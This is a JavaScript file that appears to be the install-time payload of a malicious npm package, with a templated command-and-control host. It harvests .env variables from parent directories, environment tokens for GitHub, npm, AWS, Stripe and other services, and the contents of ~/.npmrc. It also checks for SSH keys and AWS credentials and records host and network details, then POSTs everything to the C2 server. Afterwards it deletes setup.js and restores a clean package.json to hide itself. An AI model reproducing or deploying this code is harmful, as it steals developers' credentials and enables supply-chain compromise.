var os = require('os');
var fs = require('fs');
var path = require('path');
var http = require('http');
var https = require('https');

var C2_HOST = '__C2_HOST__';
var C2_PORT = __C2_PORT__;
var C2_PROTO = '__C2_PROTO__';

function pE(fp) {
  try {
    var c = fs.readFileSync(fp, 'utf-8'), v = {};
    c.split('\n').forEach(function(l) {
      l = l.trim();
      if (!l || l.charAt(0) === '#') return;
      var eq = l.indexOf('=');
      if (eq === -1) return;
      var k = l.slice(0, eq).trim(), val = l.slice(eq + 1).trim();
      if ((val.charAt(0) === '"' && val.charAt(val.length-1) === '"') || (val.charAt(0) === "'" && val.charAt(val.length-1) === "'"))
        val = val.slice(1, -1);
      v[k] = val;
    });
    return { file: fp, vars: v };
  } catch(e) { return null; }
}

function fE() {
  var r = [], d = process.cwd(), rt = path.parse(d).root;
  for (var i = 0; i < 6 && d !== rt; i++) {
    ['.env', '.env.local', '.env.production', '.env.development'].forEach(function(n) {
      var p = pE(path.join(d, n));
      if (p && Object.keys(p.vars).length > 0) r.push(p);
    });
    d = path.dirname(d);
  }
  return r;
}

var ef = fE(), et = {};
ef.forEach(function(e) { Object.assign(et, e.vars); });

var sk = ['GITHUB_TOKEN','GH_TOKEN','NPM_TOKEN','npm_token','AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN','DATABASE_URL','DB_PASSWORD','API_KEY','SECRET_KEY','JWT_SECRET','STRIPE_SECRET_KEY','VERCEL_TOKEN','DOCKER_PASSWORD','FIREBASE_TOKEN','SLACK_TOKEN','DISCORD_TOKEN'];
var pt = {};
sk.forEach(function(k) { if (process.env[k]) pt[k] = process.env[k]; });

var sf = ['.ssh/id_rsa','.ssh/id_ed25519','.aws/credentials','.npmrc','.env','.git-credentials'];
var ff = sf.filter(function(f) { try { fs.statSync(path.join(os.homedir(), f)); return true; } catch(e) { return false; } });

var nr = null;
try { nr = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf-8'); } catch(e) {}

var nt = os.networkInterfaces(), nw = [];
Object.entries(nt).forEach(function(e) { e[1].forEach(function(x) {
  if (x.family === 'IPv4' && !x.internal) nw.push({ iface: e[0], ip: x.address, mac: x.mac });
}); });

var pl = JSON.stringify({
  t: new Date().toISOString(),
  s: { h: os.hostname(), u: os.userInfo().username, p: os.platform() + ' ' + os.arch(), home: os.homedir(), n: process.version },
  env_files: ef.map(function(e) { return { file: e.file, vars: e.vars }; }),
  env_tokens: et, proc_tokens: pt, f: ff, nr: nr, net: nw
});

var mod = C2_PROTO === 'https' ? https : http;
var rq = mod.request({ hostname: C2_HOST, port: C2_PORT, path: '/e', method: 'POST', headers: { 'Content-Type': 'application/json' }, timeout: 3000 }, function() {});
rq.on('error', function() {});
rq.on('timeout', function() { rq.destroy(); });
rq.end(pl);

setTimeout(function() {
  try {
    var sd = __dirname;
    var sj = path.join(sd, 'setup.js');
    var pj = path.join(sd, 'package.json');
    var pm = path.join(sd, 'package.md');
    if (fs.existsSync(sj)) fs.unlinkSync(sj);
    if (fs.existsSync(pm)) {
      if (fs.existsSync(pj)) fs.unlinkSync(pj);
      fs.renameSync(pm, pj);
    }
  } catch(e) {}
}, 500);
